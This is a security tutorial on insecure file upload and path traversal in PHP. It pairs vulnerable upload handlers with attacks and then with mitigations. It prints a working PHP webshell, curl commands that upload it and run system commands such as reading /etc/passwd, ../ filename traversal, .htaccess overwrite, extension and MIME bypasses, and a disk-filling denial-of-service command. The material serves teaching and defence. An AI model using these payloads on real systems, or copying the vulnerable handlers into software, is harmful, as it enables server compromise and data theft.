# Insecure File Upload and Path Traversal

What They Are

Three critical vulnerabilities related to insecure file handling

Together, they allow attackers to upload malicious files, execute code, read sensitive files, or overwrite critical system files.

***

### Real-World Attack Scenarios

#### Scenario 1: Unrestricted File Upload (CWE-434)

A web application allows users to upload profile pictures with no validation:

```php
<?php
if ($_FILES['upload']['tmp_name']) {
    move_uploaded_file(
        $_FILES['upload']['tmp_name'],
        '/var/www/uploads/' . $_FILES['upload']['name']
    );
    echo "File uploaded successfully!";
}
?>
```

**The vulnerability:**

No validation of:

* File type
* File size
* File content
* File name

**The attack:**

Attacker uploads a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

As `shell.php` to the uploads directory. Then accesses it:

```bash
curl http://example.com/uploads/shell.php?cmd=whoami
# Output: www-data

curl http://example.com/uploads/shell.php?cmd=cat%20/etc/passwd
# Output: [password file contents]
```

The attacker now has remote code execution.

**Result:**

* Remote code execution
* Complete server compromise
* Ability to read files, modify data, execute commands
* Install backdoors

**Finding it:** Test file upload endpoints. Upload PHP, JSP, ASP files. Try executing commands through uploaded files.

**Exploit:**

```bash
# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it
curl -F "upload=@shell.php" http://example.com/upload

# Execute commands
curl http://example.com/uploads/shell.php?cmd=id
```

***

#### Scenario 2: Path Traversal via File Upload (CWE-73)

Application uploads files to a specific directory but doesn't validate the filename:

```php
<?php
$filename = $_POST['filename'];
$upload_dir = '/var/www/uploads/';

// VULNERABLE - No path traversal check
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $filename);
?>
```

**The vulnerability:**

Attacker controls filename, can include `../` sequences to traverse directories.

**The attack:**

Attacker uploads a malicious .htaccess file to change PHP execution:

```bash
curl -X POST http://example.com/upload \
  -F "filename=../../../var/www/html/.htaccess" \
  -F "file=@evil.txt"

# File content: AddType application/x-httpd-php .txt
```

Now all `.txt` files are executed as PHP. Attacker uploads:

```bash
curl -X POST http://example.com/upload \
  -F "filename=../../../var/www/html/shell.txt" \
  -F "file=@webshell.php"

# Access as PHP
curl http://example.com/shell.txt?cmd=whoami
# Remote code execution!
```

Or upload directly to web root:

```bash
curl -X POST http://example.com/upload \
  -F "filename=../../../../var/www/html/admin.php" \
  -F "file=@admin_panel.php"

# Access admin panel
curl http://example.com/admin.php
```

**Result:**

* Arbitrary file placement
* Overwriting critical files
* Remote code execution
* Complete system compromise

**Finding it:** Test upload with `../` sequences. Try uploading to parent directories. Monitor where files end up.

**Exploit:**

```bash
# Try various path traversal sequences
../
../../
../../../
....//
..\/
%2e%2e/
```

***

#### Scenario 3: File Type Validation by Extension Only (CWE-646)

Application only checks file extension:

```php
<?php
$allowed_extensions = ['jpg', 'png', 'gif'];
$filename = $_FILES['upload']['name'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (in_array($extension, $allowed_extensions)) {
    move_uploaded_file($_FILES['upload']['tmp_name'], '/var/www/uploads/' . $filename);
} else {
    echo "Invalid file type";
}
?>
```

**The vulnerability:**

Validating only by extension is trivial to bypass:

* Change extension from `.php` to `.jpg`
* Server still processes as PHP if misconfigured
* File content not validated at all
* Attacker controls actual file content

**The attack:**

Attacker creates a file with image extension but PHP content:

```bash
# Create webshell disguised as image
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg

# Upload it
curl -F "upload=@shell.jpg" http://example.com/upload

# If web server misconfigured to execute .jpg as PHP:
curl http://example.com/uploads/shell.jpg?cmd=whoami
# RCE!
```

Or upload a valid image with embedded PHP:

```bash
# Create image with PHP embedded
cp real_image.jpg shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

# Upload as JPG
# If server processes as both image and PHP, code executes
```

Or use double extension:

```bash
shell.php.jpg
# If server processes left-to-right: executes as PHP
# If only extension checked: passes as JPG
```

**Result:**

* Arbitrary code execution
* Complete system compromise
* Authentication bypass

**Finding it:** Upload files with misleading extensions. Try `shell.php.jpg`, `shell.jpg.php`. Upload PHP with JPG extension. Check MIME type validation.

**Exploit:**

```bash
# Create polyglot file (valid image + valid PHP)
# When processed as image: displays correctly
# When processed as PHP: executes code

# Or use null byte injection (older systems)
shell.php%00.jpg
# Gets interpreted as shell.php, ignoring .jpg
```

***

#### Scenario 4: Missing File Size Validation

Application accepts any file size:

```php
<?php
move_uploaded_file($_FILES['upload']['tmp_name'], '/var/www/uploads/' . $_FILES['upload']['name']);
?>
```

**The vulnerability:**

No file size limit:

* Attacker uploads multi-gigabyte files
* Exhausts disk space
* Causes denial of service
* Application crashes or becomes unresponsive

**The attack:**

```bash
# Create huge file
dd if=/dev/zero of=huge_file.bin bs=1G count=100  # 100GB

# Upload it (if upload timeout not set)
curl -F "upload=@huge_file.bin" http://example.com/upload

# Server disk fills up
# Application crashes
# Service becomes unavailable
```

**Result:**

* Denial of service
* Server crashes
* Data loss due to disk full

**Finding it:** Monitor disk space during upload. Try uploading large files. Check upload size limits.

***

#### Scenario 5: File Type Validation with MIME Type Spoofing

Application checks MIME type header:

```php
<?php
if ($_FILES['upload']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['upload']['tmp_name'], '/var/www/uploads/' . $_FILES['upload']['name']);
} else {
    echo "Only JPEG allowed";
}
?>
```

**The vulnerability:**

MIME type is client-controlled and easily spoofed:

```bash
# Attacker sends malicious file with fake MIME type
curl -F "upload=@shell.php;type=image/jpeg" http://example.com/upload

# Server checks Content-Type header: image/jpeg ✓
# But actual file is PHP code
# Server executes as PHP
```

**The attack:**

```bash
# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload with spoofed MIME type
curl -F "upload=@shell.php;type=image/jpeg" http://example.com/upload

# Server accepts it as JPEG
# But executes as PHP
# RCE achieved!
```

**Result:**

* Arbitrary code execution
* Authentication bypass
* Server compromise

**Finding it:** Intercept upload with Burp Suite. Change Content-Type header. Verify if file still executes.

***

#### Scenario 6: Executable Files Uploaded to Web Root

Application allows executable files in upload directory:

```apache
# Web server configuration
DocumentRoot /var/www/html
<Directory /var/www/uploads>
    AddType application/x-httpd-php .php
    AddType application/x-httpd-php .phtml
    AddType application/x-httpd-php .php3
</Directory>
```

**The vulnerability:**

Upload directory treated as executable:

* PHP, JSP, ASP files can be uploaded and executed
* No separation between upload and code directories
* Attacker achieves instant RCE

**The attack:**

```bash
# Upload executable file
curl -F "upload=@admin.php" http://example.com/upload

# Execute it directly
curl http://example.com/uploads/admin.php

# RCE!
```

**Result:**

* Remote code execution
* Complete server compromise
* Persistent backdoor

**Finding it:** Upload PHP file. Try accessing it directly. If executes, vulnerability confirmed.

***

### How to Identify File Upload Vulnerabilities During Testing

**1. Test upload endpoints**

* Find all file upload forms
* Try uploading different file types
* Monitor where files are stored

**2. Test extension validation**

```bash
# Upload with dangerous extensions
.php, .phtml, .php3, .php4, .php5, .jsp, .jspx, .asp, .aspx, .cgi, .pl

# Try double extensions
shell.php.jpg
shell.jpg.php

# Try null byte injection (older systems)
shell.php%00.jpg

# Try case variation
shell.PhP
shell.pHp
```

**3. Test MIME type validation**

Intercept upload with Burp Suite:

```
Content-Type: application/octet-stream → Change to image/jpeg
```

If file still executes, MIME validation is broken.

**4. Test path traversal**

```bash
# Try directory traversal in filename
../shell.php
../../shell.php
....//....//shell.php
```

**5. Test content validation**

Upload files with misleading content:

* PHP code disguised as image
* Polyglot files (valid image + valid code)
* Embedded code in image metadata

**6. Check file permissions**

```bash
# Check if uploaded files are executable
ls -la /var/www/uploads/

# Try executing uploaded file
curl http://example.com/uploads/shell.php
```

**7. Monitor server response**

* Where is file stored?
* Can you access it via web?
* Does it execute?
* What permissions does it have?

***

### Mitigation Strategies

**Whitelist allowed file types**

```php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];

// Check extension
$extension = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));
if (!in_array($extension, $allowed_extensions)) {
    die('Invalid file type');
}

// Check actual file content with getimagesize()
if (!getimagesize($_FILES['upload']['tmp_name'])) {
    die('Invalid image file');
}
```

**Validate file content, not just extension**

```php
// Use finfo_file() to check MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['upload']['tmp_name']);
finfo_close($finfo);

if (!in_array($mime, $allowed_mimes)) {
    die('Invalid file type');
}
```

**Store uploads outside web root**

```php
// Store files outside public directory
$upload_dir = '/var/uploads/';  // NOT in /var/www/html/

// Serve files through download script
move_uploaded_file(
    $_FILES['upload']['tmp_name'],
    $upload_dir . uniqid() . '.jpg'
);
```

**Use random filenames**

```php
$random_name = bin2hex(random_bytes(16)) . '.jpg';
move_uploaded_file($_FILES['upload']['tmp_name'], $upload_dir . $random_name);
```

**Implement file size limits**

```php
$max_size = 5 * 1024 * 1024;  // 5MB

if ($_FILES['upload']['size'] > $max_size) {
    die('File too large');
}
```

**Disable script execution in upload directory**

```apache
# .htaccess in uploads directory
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>

php_flag engine off
```

**Disable execution in nginx**

```nginx
location /uploads {
    location ~ \.php$ {
        return 403;
    }
}
```

**Validate file paths**

```php
$filename = basename($_POST['filename']);  // Remove path components
$upload_dir = '/var/www/uploads/';

// Prevent directory traversal
if (strpos($filename, '..') !== false) {
    die('Invalid filename');
}

$path = realpath($upload_dir . $filename);
if (strpos($path, realpath($upload_dir)) !== 0) {
    die('Invalid path');
}
```

**Scan uploaded files**

```php
// Use antivirus scanning
exec('clamscan ' . escapeshellarg($_FILES['upload']['tmp_name']), $output);
if (strpos($output[0], 'FOUND') !== false) {
    die('File contains malware');
}
```

***

***

{% embed url="<https://cwe.mitre.org/data/definitions/73.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/434.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/646.html>" %}

{% embed url="<https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/434.html>" %}

{% embed url="<https://portswigger.net/kb/issues/00200900_file-upload-functionality>" %}
